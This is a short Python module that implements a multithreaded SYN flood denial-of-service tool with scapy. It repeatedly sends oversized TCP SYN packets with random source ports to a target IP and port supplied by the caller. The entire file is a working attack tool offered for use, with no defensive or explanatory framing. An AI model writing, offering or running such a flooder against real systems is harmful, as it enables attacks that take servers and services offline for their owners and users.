import logging

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort

from threading import Thread

class _Manager:
    def __init__(self, target: str, dport: int, num_of_threads: int = 1):
        self.target = target
        self.dport = dport
        self.num_of_threads = num_of_threads

        self.running = False
        self.threads: list[Thread] = []

    def start(self):
        self.running = True

        logging.debug("Starting threads...")
        for _ in range(self.num_of_threads):
            t = Thread(target=self._syn, args=(self.target, self.dport))
            t.start()
            self.threads.append(t)
        
        logging.debug("Started threads.")

    def stop(self):
        self.running = False

        for t in self.threads:
            t.join()

    def _syn(self, target: str, dport: int):
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=dport, flags="S")
        raw = Raw(b"X" * 32768)
        p = ip / tcp / raw

        while self.running:
            send(p, verbose=False)

def syn(target_ip: str, target_port: int, num_of_threads: int = 1):
    logging.info(f'Starting SYN flood on {target_ip}:{target_port}')

    try:
        manager = _Manager(target_ip, target_port, num_of_threads)
        manager.start()
        
        while True:
            pass
    except KeyboardInterrupt:
        logging.info('\rStopping SYN attack')
        manager.stop()